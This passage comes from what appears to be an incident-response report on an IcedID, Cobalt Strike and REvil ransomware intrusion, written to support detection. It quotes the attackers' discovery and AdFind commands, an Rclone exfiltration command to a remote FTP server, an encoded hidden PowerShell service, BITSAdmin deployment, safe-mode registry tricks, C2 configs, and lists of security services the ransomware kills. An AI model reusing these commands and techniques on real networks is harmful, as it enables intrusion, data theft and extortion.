FileVersion:\n    Description: Microsoft Management Console\n    Product: Microsoft Windows® Operating System\n    Company: Microsoft Corporation\n    OriginalFileName: mmc.exe\n    CommandLine: \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\gpmc.msc\"\n    CurrentDirectory: C:\\Users\\\n    User:\n    LogonGuid:\n    LogonId:\n    TerminalSessionId: 3\n    IntegrityLevel: High\n    Hashes:\n      SHA1: 715ABDA53ECDAD6A136F56A41A97444F24CA3195, MD5: 0ED2577AA82A3B1C155843F23B7E377D2\n    ParentProcessGuid: {46d5468e-d526-604f-341a-000000000000}\n    ParentProcessId: 5268\n    ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n    ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n```\n\nThe GPO was named “new”.\n\n```image\nAlt: GPO Name\nDescription: The image displays a section of a Group Policy Object (GPO) configuration related to Windows Defender Antivirus. It shows the 'Computer Configuration (Enabled)' header, followed by 'Policies' and 'Administrative Templates.' Under 'Windows Components/Windows Defender Antivirus,' two policies are listed: 'Turn off routine remediation' and 'Turn off Windows Defender Antivirus,' both marked as 'Enabled.' This indicates that these settings were altered to disable essential security measures, likely in the context of a cyber threat scenario involving ransomware.\nTranscription: |\n  Computer Configuration (Enabled)\n  Policies\n    Administrative Templates\n      Policy definitions (ADMX files) retrieved from the local computer.\n        Windows Components/Windows Defender Antivirus\n          Policy                                 Setting\n          Turn off routine remediation           Enabled\n          Turn off Windows Defender Antivirus    Enabled\n```\n\n#### Credential Access\n\nCredentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n\n```image\nAlt: Credential Dump\nDescription: The image displays a detailed technical breakdown of two processes related to credential dumping, likely from a cybersecurity analysis of a ransomware incident. It includes information on the processes '2f092e6.exe' and 'lsass.exe,' showing attributes such as execution time, path, integrity level, access privileges, process ID, command line, and cryptographic hashes (SHA1 and SHA256) for 'lsass.exe.' The structure indicates a hierarchical representation of process relationships, providing insights into how the malware operates.\nTranscription: |\n  2f092e6.exe\n  - Process name: 2f092e6.exe\n  - Execution time: [REDACTED]\n  - Path: \\\\[REDACTED]\\ADMIN$\\2f092e6.exe\n  - Integrity level: System\n  - Access privileges (UAC): Default\n  - Process ID: 4836\n  - Command line: 2f092e6.exe\n  \n      rundll32.exe\n      └── wuauserv.exe\n          └── lsass.exe\n              - Process name: lsass.exe\n              - Execution time: [REDACTED]\n              - Path: C:\\Windows\\System32\\lsass.exe\n              - Integrity level: System\n              - Access privileges (UAC): Default\n              - Process ID: 592\n              - Command line: lsass.exe\n              - File name: lsass.exe\n              - Full path: C:\\Windows\\System32\\lsass.exe\n              - SHA1: 0fb26350106c9bdd196d4e7d01eb30\n              - SHA256: bbc83e4759d4b82bad31e371ad679a\n              - Signer: Unknown\n```\n\n#### Discovery\n\nInitial discovery by the IcedID malware occurred within minutes of execution:\n\n```\ncmd.exe /c chcp >&2\nWMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nipconfig.exe ipconfig /all\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet.exe net group \"Domain Admins\" /domain\n```\n\nA flurry of LDAP queries were seen coming from `wuauclt.exe` (Cobalt Strike) on the beachhead.\n\n```\n\"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n\"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n...\n```\n\nWe believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n\n```image\nAlt: BloodHound Results\nDescription: The image displays a detailed breakdown of the process 'wuauclt.exe', including various attributes such as execution time, path, integrity level, access privileges, process ID, command line, file name, full path, SHA1, SHA256 hashes, signer, and issuer. Additionally, it shows a created file named 'BloodHound.zip' with its own attributes, including file name, full path, SHA1, SHA256 hashes, and signer information. This information is crucial for understanding the context of the Sodinokibi (REvil) ransomware's discovery phase and its associated activities.\nTranscription: |\n  Process name: wuauclt.exe\n  Execution time: Mar [redacted]\n  Path: c:\\windows\\system32\\wuauclt.exe\n  Integrity level: Medium\n  Access privileges (UAC): Restricted\n  Process ID: 624\n  Command line: WUAUCLT.exe\n  File name: wuauclt.exe\n  Full path: c:\\windows\\system32\\wuauclt.exe\n  SHA1: 58680265bb320f64920f6ec03702dca63b7c2\n  SHA256: efa27c2ee5a31f1fe4a1d59023702560614aa55\n  Signer: Microsoft Windows\n  Issuer: Microsoft Windows Production PCA 2011\n  \n  created file:\n  202103[redacted]_BloodHound.zip\n  File name: 202103[redacted]_BloodHound.zip\n  Full path: C:\\Users\\Public\\202103[redacted]_BloodHound.zip\n  SHA1: 5464e073dd8af58fce96b870587666f6f4c1e\n  SHA256: 2f390719b83dc67b62db8291bdfb80839964\n  Signer: Unknown\n```\n\nOnce on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\n\nAdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n\n```image\nAlt: AdFind\nDescription: The image displays detailed information about the execution of the AdFind.exe process, including its command line arguments, file paths, and cryptographic hashes (SHA1 and SHA256). It shows the process tree with AdFind.exe as a child of cmd.exe and rundll32.exe, indicating the execution context. The image also includes details such as process ID, integrity level, and access privileges, which are relevant for understanding potential security incidents involving this tool.\nTranscription: |\n  AdFind.exe\n  - Process Name: AdFind.exe\n  - Execution time: [REDACTED]\n  - Path: c:\\users\\public\\adfind.exe\n  - Integrity level: System\n  - Access privileges (UAC): Standard\n  - Process ID: 1068\n  - Command line: adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  - File Name: AdFind.exe\n  - Full path: c:\\users\\public\\adfind.exe\n  - SHA1: 4f48fc0f9b47d0ad95d159201fe7e72fbc844\n  - SHA256: c92c158d7c37fea795114fa6491fe5f145ad2f\n  - Signer: Unknown\n  \n  some.csv\n  - File Name: some.csv\n  - Full path: C:\\Users\\Public\\some.csv\n  - SHA1: 1c6e6237597881509769443aa477e1f403\n  - SHA256: 47a71807771fa2c48147ca0f3440a02fdc\n  - Signer: Unknown\n```\n\n```\ncmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv\n```\n\n#### Lateral Movement\n\nFor lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n\n```image\nAlt: Cobalt Strike Lateral Movement\nDescription: The image is a diagram illustrating the lateral movement of Cobalt Strike within a network. It shows an 'Infected Workstation' connecting to an 'Exchange Server', which then links to 'Domain Controllers', 'Servers', and 'Workstations'. The connections are represented with arrows, indicating the pathways of lateral movement in a compromised environment. The diagram is clearly labeled, making it easy to understand the relationships and flow of potential threats.\nTranscription: |\n  Cobalt Strike Lateral Movement\n  - Infected Workstation\n    - Exchange Server\n      - Domain Controllers\n      - Servers\n      - Workstations\n```\n\nCobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n\n```image\nAlt: SMB Transfer\nDescription: The image displays a log entry related to a system event, specifically the creation of a file. It includes technical details such as the Process GUID, Process ID, image source (System), and the target filename 'C:\\Windows\\0ddb81e.exe'. This log entry is relevant to monitoring and analyzing potential malicious activity, likely in the context of ransomware deployment.\nTranscription: |\n  data.win.system.level\n  4\n  data.win.system.message\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {78E9F60F-D30F-6048-0100-000000000080}\n  ProcessId: 4\n  Image: System\n  TargetFilename: C:\\Windows\\0ddb81e.exe\n  CreationUtcTime:\n```\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a log entry from a Windows system indicating that a new service was installed. It includes details such as the service name ('@ddb81e'), the service file path ('\\ADMONS\\@ddb81e.exe'), the service type (user mode service), the service start type (demand start), and the service account (LocalSystem). This data is relevant for understanding potential malicious activities, particularly in the context of ransomware attacks like Sodinokibi (REvil), as it shows how threat actors may install services to maintain persistence.\nTranscription: |\n  data.win.system.level 4\n  data.win.system.message \"A service was installed in the system.\n  \n  Service Name: @ddb81e\n  Service File Name: \\\\ADMIN$\\@ddb81e.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\n```image\nAlt: PowerShell Execution\nDescription: The image displays a text output that appears to be a service installation log related to a ransomware attack. It includes a service name (39884d), service file path indicating the use of PowerShell with an encoded command, and details about the service type, start type, and service account. The content is highly technical and relevant to cyber threat intelligence, specifically illustrating how a malicious service may be set up within a compromised system.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: 398843\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD8ATgBlAHcAQQB1AG8AIAAgAEcAIAAgAFAuAG8AbgAIAEwAbgAIAEwAbg...\n```\n\nTo facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n\n#### Collection\n\nThe Rclone utility was used to collect information from file shares and to exfiltrate the data.\n\n```\nsvchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n```image\nAlt: Rclone\nDescription: The image is a screenshot of a command line interface displaying technical details about the Rclone utility. It includes information such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), description (Rsync for cloud storage), product name (Rclone), company URL (https://rclone.org), and the original filename (rclone.exe). Additionally, it shows the command line used for executing Rclone to copy files from a specified network share to an FTP location.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n#### Command and Control\n\nIcedID:\n\n- cikawemoret34.space\n- 206.189.10.247:80\n\n```\nnomovee.website\n161.35.109.168:443\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\n```\n\n**Certificate:**\n\n```\ne0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43\nNot Before: 2021/03/11 02:06:51\nNot After: 2022/03/11 02:06:51\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n- 45.86.163.78:443\n- cloudmetric.online\n- JA3: a0e9f5d64349fb13191bc781f81f42e1\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\nb9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3\nNot Before: 2021/02/27 06:45:42\nNot After: 2021/05/28 07:45:42\nIssuer Org: Let's Encrypt\nSubject Common: cloudmetric.online\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\",\n    \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\",\n    \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\",\n    \"time\": 1615840900656.6\n  },\n  \"x86\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\",\n    \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\",\n    \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\",\n    \"time\": 1615840895189\n  }\n}\n```\n\n- 195.189.99.74\n- smalleststores.com\n- JA3: 72a589da586844d7f0818ce684948eea\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\n14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df\nNot Before: 2021/03/11 11:02:43\nNot After: 2021/06/09 12:02:43\nIssuer Org: Let's Encrypt\nSubject Common: smalleststores.com\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x86\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"88365eb3d504f570f22d76f777ab2caf\",\n    \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\",\n    \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\",\n    \"time\": 1615846680369.8\n  },\n  \"x64\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\",\n    \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\",\n    \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\",\n    \"time\": 1615846684589\n  }\n}\n```\n\n#### Exfiltration\n\nData that was collected from the domain was exfiltrated to a remote server at:\n\n```\n45.147.160.5:443\n```\n\n```image\nAlt: Exfiltration\nDescription: The image displays a terminal output showing details about a specific executable process related to cloud storage synchronization. It lists various attributes such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), a description (Rsync for cloud storage), product name (Rclone), company website, original filename (rclone.exe), and the command line used to execute the process. This information is typically relevant to cybersecurity analysis, particularly in identifying potential malicious activity associated with the Sodinokibi (REvil) ransomware.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\\\c$\\path\" ftp://user:password@host/path/\n```\n\n```image\nAlt: Exfiltration\nDescription: The image shows a detailed technical analysis related to the Sodinokibi (REvil) ransomware, specifically focusing on the exfiltration process. It includes information about the 'svchost.exe' process, such as its execution time, file path, integrity level, access privileges, and process ID. The command line used for executing 'svchost.exe' is displayed, indicating that it involved a file transfer, likely for data exfiltration. Additionally, the image provides cryptographic hashes (SHA1 and SHA256) for the 'svchost.exe' file, along with the IP address (45.147.160.5) and port (443) to which the connection was established, categorizing it under TCP protocol.\nTranscription: |\n  svchost.exe\n    Process name: svchost.exe\n    Execution time: [REDACTED]\n    Path: c:\\windows\\svchost.exe\n    Integrity level: System\n    Access privileges (UAC): Standard\n    Process ID: 2364\n    Command line: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\[REDACTED]\\C$\\[REDACTED]\" ftp:1:/C/[REDACTED]\n    File name: svchost.exe\n    Full path: c:\\windows\\svchost.exe\n    SHA1: fcfcf1e45e8d5cdca0450b8dc90754b68e8e\n    SHA256: 538078ab6d80d7cf889af3e08f62c4e83358\n    Signer: Unknown\n  \n  successfully established connection with\n    IP address: 45.147.160.5\n    Port: 443\n    Protocol: Tcp\n```\n\n#### Impact\n\nFor the final actions, the threat actors dropped a ransomware executable on the domain controller in `C:\\Windows` and then used BITSAdmin to deploy the executable to remote systems.\n\n```\nC:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe\n```\n\nThe `-smode` flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.\n\n```image\nAlt: smode Execution\nDescription: The image is a flowchart illustrating the execution process of the Sodinokibi (REvil) ransomware in Safe Mode. It depicts the sequence of processes involved, starting from an RDP login and the parent processes like 'explorer.exe' and 'PowerShell.exe'. The flowchart also includes details of child processes such as 'Bitsadmin.exe' and 'DomainName.exe', highlighting the commands used to execute the ransomware and set system configurations. Additionally, it shows how registry values are manipulated to ensure the system reboots into Safe Mode with Networking and later exits it.\nTranscription: |\n  Sodinokibi (aka REvil) smode Execution\n  \n  RDP Login\n  Parent Process\n  C:\\Windows\\explorer.exe / NOUACCHECK\n      |\n      +-- Parent Process\n          PowerShell.exe\n              |\n              +-- Child Process\n                  Bitsadmin.exe\n                      |\n                      +-- Child Process\n                          DomainName.exe\n                              |\n                              +-- C:\\Windows\\DomainName.exe -smode\n                                  System auto reboots into Safe Mode with Networking within seconds of execution\n                              |\n                              +-- bcdeidt.exe\n                                  |\n                                  +-- Registry value set:\n                                      Key: HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                      Value name: *AstraZeneca\n                                      Value data: C:\\windows\\DomainName.exe\n                              |\n                              +-- Registry value set:\n                                  Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                  Value name: *franceisshit\n                                  Value data: bcdeidt /deletevalue {current} safeboot\n```\n\nThe `*franceisshit` key was used to boot the machine out of Safe Mode upon restarting the machine.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a log entry detailing an event related to a ransomware operation. It includes various elements such as the event type ('SetValue'), an image path indicating the location of the executed file, and a unique process ID. Additionally, it references a specific registry key associated with the ransomware's command execution, highlighting the technique used by the threat actors to manipulate system settings for their malicious intent. This information is relevant for understanding the actions and tactics employed by ransomware groups.\nTranscription: |\n  details       : bcdedit /deletevalue {current} safeboot\n  eventType     : SetValue\n  image         : C:\\Windows\\*.exe\n  processGuid   : {b093c253-dfa5-604f-3c07-000000000100}\n  processId     : 6512\n  ruleName      : technique_id=T1547.001, technique_name=Registry Run Keys / Start Folder\n  targetObject  : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit\n```\n\nThe systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\n\nWe’ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n\nAfter rebooting out of Safe Mode, you are left with the following desktop:\n\n```image\nAlt: Desktop\nDescription: The image is a screenshot of a ransom note displayed in a Notepad window. The note informs the victim that their files are encrypted and currently unavailable, providing instructions on how to recover them. It emphasizes the importance of following the instructions and warns that contacting the attackers is necessary to potentially restore the files. The note includes details on accessing a website via a TOR browser or VPN for further instructions, and it mentions the potential for private data to be published if contact is not made. The overall tone is threatening and demand-driven.\nTranscription: |\n  All of your files are encrypted!\n  Find _________-readme.txt and follow instructions\n  \n  ------ Welcome. Again. ------\n  [+] Whats Happen? [+]\n  Your files are encrypted, and currently unavailable. You can check it: all files on your system has extension ________.\n  By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\n  \n  ========Attention!!=========\n  Also your private data was downloaded. We will publish it in case you will not get in touch with us asap.\n  ===========================\n  \n  [+] What guarantees? [+]\n  Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will. To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.\n  If you will not cooperate with our service - for us, it does not matter. But you will lose your time and data, cause just we have the private key.\n  \n  [+] How to get access on website? [+]\n  You have two ways:\n  1) [Recommended] Using a TOR browser!\n     a) Download and install TOR browser from this site: https://torproject.org/\n     b) Open our website: http://___________:929\n  \n  2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:\n     a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)\n     b) Open our secondary website: http://___________\n  \n  Warning: secondary website can be blocked, thats why first variant much better and more available.\n  When you open our website, put the following data in the input form:\n  Key:\n```\n\nOn certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by `rundll32` to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n\n```\nC:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer\n```\n\n```image\nAlt: rundll32 Execution\nDescription: The image displays a detailed output of a command-line analysis related to the execution of the `rundll32.exe` process. It includes various metadata such as command line, company, current directory, file version, and hashes associated with the process. Additionally, it provides information on the integrity level, logon GUID, logon ID, original file name, and the parent command line and image, indicating that the `rundll32.exe` was executed to register a DLL file during a potential ransomware attack.\nTranscription: |\n  commandLine: 'C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\...\\DomainName.dll,DllRegisterServer'\n  company: Microsoft Corporation\n  currentDirectory: C:\\Users\\_________\\\n  description: Windows host process (Rundll32)\n  fileVersion: __________\n  hashes:\n    SHA1: F3BA3415D60A8871F285570BEA2E29874CBFF1, MD5: C73BA51880F5A7B20C84185A23212EF, SHA256: __________\n  image: C:\\Windows\\System32\\rundll32.exe\n  integrityLevel: High\n  logonGuid: {4ea529df-c91f-604f-3cb4-a70e00000000}\n  logonId: 0xea7b43c\n  originalFileName: RUNDLL32.EXE\n  parentCommandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n  parentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThe threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here’s a few screenshots from the website.\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed on a computer screen, indicating that the network has been infected by ransomware. It features a prominent red header stating 'Your network has been infected!' along with a brief explanation of the situation. The note assures victims that their files are encrypted and provides instructions on how to purchase a decryption tool, referred to as 'General-Decryptor,' along with a price mention for all PCs on the infected network. Additional sections prompt users to follow instructions, chat support, and details about decryption.\nTranscription: |\n  Your network has been infected!\n  \n  Your documents, photos, databases and other important files encrypted\n  \n  To decrypt your files you need to buy our special software - General-Decryptor\n  \n  Follow the instructions below. But remember that you do not have much time\n  \n  General-Decryptor price\n  the price is for all PCs of your infected network\n  \n  How to decrypt files?\n  You will not be able to decrypt the files yourself. If you try, you will lose your files forever.\n  \n  Buy XMR (no need for verification)\n  - LocalMonero\n```\n\nWith the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n\n```image\nAlt: Config\nDescription: The image displays a malware analysis report specifically for the Sodinokibi (REvil) ransomware. It includes general information such as the target file 'DomainName.exe', its size (120KB), and a sample identifier. The report features a score of 10/10, suggesting high severity. Additionally, it lists hashes (MD5, SHA1, SHA256, SHA512) corresponding to the malware, confirming its identity and integrity. The extracted malware configuration section outlines attributes like 'Family' as 'sodinokibi', a 'Botnet', and a 'Campaign ID' of 7114, indicating its operational context.\nTranscription: |\n  {\n    \"General\": {\n      \"Target\": \"DomainName.exe\",\n      \"Size\": \"120KB\",\n      \"Sample\": \"210321-rI7ygjf6sa\",\n      \"Score\": \"10/10\",\n      \"MD5\": \"af94dccb62f97700115a219c4b7626d22\",\n      \"SHA1\": \"bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\",\n      \"SHA256\": \"2896b38ec3ff196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\",\n      \"SHA512\": \"08c05fd98aba168734732d043c3e403f531522e0ec64484d15375f353aa23f9654852ad2c54a3e6b2a93\"\n    },\n    \"Malware Config\": {\n      \"Extracted\": {\n        \"Family\": \"sodinokibi\",\n        \"Botnet\": \"$2a$\",\n        \"Campaign\": \"7114\"\n      }\n    }\n  }\n```\n\n```\nCampaign ID (sub): 7114\nnet: false\n```\n\nList of processes to kill (prc):\n\n```\noracle\nklnagent\nmydesktopqos\ninfopath\nBackupExtender\npowerpnt\noutlook\nBackupAgent\nSmc\nsql\nccSvcHst\nBackupUpdater\nRtvscan\nwinword\nkavfsscs\nocssd\nisqlplussvc\nvisio\nShadowProtectSvc\ntbirdconfig\nTSSchBkpService\ndbeng50\nccSetMgr\nagntsvc\nSage.NA.AT_AU.SysTray\ndbsnmp\nthebat\nonenote\nAmitiAvSrv\nwordpad\nmsaccess\navgadmsv\nthunderbird\nBackupMaint\nMicrosoft.exchange.store.worker.exe\nCarboniteUI\nexcel\nSPBBCSvc\nLogmeInBackupService\nencsvc\nocomm\nsqbcoreservice\nNSCTOP\nmydesktopservice\nkavfs\nkavfswp\nocautoupds\nmspub\nxfssvccon\nDLOAdminSvcu\nsynctime\nlmibackupvssservice\nfirefox\nsteam\ndlomaintsvcu\n```\n\nList of services to kill:\n\n```\nTelemetryserver\n\"Sophos AutoUpdate Service\"\nsophos\nAltaro.Agent.exe\nmysqld\nMSSQL$MSGPMR\n\"SophosFIM\"\n\"Sophos Web Control Service\"\nSQLWriter\nsvcGenericHost\nAltiBack\n\"SQLServer Analysis Services (MSSQLSERVER)\"\nBackupExecAgentAccelerator\n\"StorageCraft ImageReady\"\nSQLTELEMETRY\nAzureADConnectAuthenticationAgent\nntrtscan\nds_notifier\nTeamViewer\n\"StorageCraft Raw Agent\"\n\"StorageCraft Shadow Copy Provider\"\nSQLTELEMETRY$SQLEXPRESS\nVeeamHvIntegrationSvc\nAltiCTProxy\nMsDtsServer130\nViprePPLSvc\nMcAfeeFramework\nMSSQL$QM\n\"swi_service\"\n\"ThreadLocker\"\nofcservice\nAUService\nsophossps\nAzureADConnectHealthSyncMonitor\nAltaro.OffsiteServer.UI.Service.exe\n\"SAVAdminService\"\nds_monitor\nALTIVRM\nSSASTELEMETRY\nTmCCSF\nMsDtsServer110\n\"Sophos MCS Client\"\nTMBMServer\nSBAMSvc\nmfewc\n\"Sophos System Protection Service\"\nMSSQLFDLauncher$TESTBACKUP02DEV\nVeeamDeploymentService\nmasvc\nbackup\nMSSQL$SQLEXPRESS\nAltiPhoneServ\nMSSQLServerOLAPService\nSSISTELEMETRY130\nVeeamEndpointBackupSvc\nmepocs\nAltaro.UI.Service.exe\n\"ds_agent\"\nHuntressUpdater\nMSSQLFDLauncher\n\"Sophos File Scanner Service\"\nSQLAgent$MSGPMR\nADSync\nKaseyaAgent\nReportServer\nMSSQLFDLauncher$SQLEXPRESS\nMSSQL$HPWJA\nKaseyaAgentEndpoint\nVeeamTransportSvc\n\"ds_monitor\"\nmfevtp\nMSSQLTESTBACKUP02DEV\nSQLTELEMETRY$MSGPMR\nThreadLocker\nMSSQLServerADHelper100\nveeam\ntmlisten\nAzureADConnectHealthSyncInsights\n\"swi_filter\"\nMsDtsServer120\nProtectedStorage\nVeeamDeploySvc\nmemtas\nds_agent\nVeeamMountSvc\nHuntressAgent\nSQLAgent$SQLEXPRESS\nbedbg\nMSSQLSERVER\n\"ofcservice\"\nVipreAAPSvc\n\"Sophos Endpoint Defense Service\"\nKACHIPS906995744173948\nDsSvc\nMSSQLLaunchpad$SQLEXPRESS\nmsseces\nmacmnsvc\nLTService\nCode42Service\nAltaro.HyperV.WAN.RemoteService.exe\nLTSvcMon\nMSSQL$SQLEXPRESSADV\n\"SAVService\"\nAltaro.OffsiteServer.Service.exe\n\"Sage 100cloud Advanced 2020 (9920)\"\nAltaro.SubAgent.exe\nmfemms\n\"TeamViewer\"\n\"SQLServer Reporting Services (MSSQLSERVER)\"\nVSS\nsql\nAltaro.SubAgent.N2.exe\n\"SQLServer Integration Services 12.0\"\nSQLSERVERAGENT\nvss\n\"Sophos Safestore Service\"\nklnagent\n\"Sage.NA.AT_AU.Service\"\nMBAMService\n\"Sophos Health Service\"\nSQLBrowser\nMySQL\n\"ProtectedStorage\"\n\"Sophos Clean Service\"\n\"Sage 100c Advanced 2017 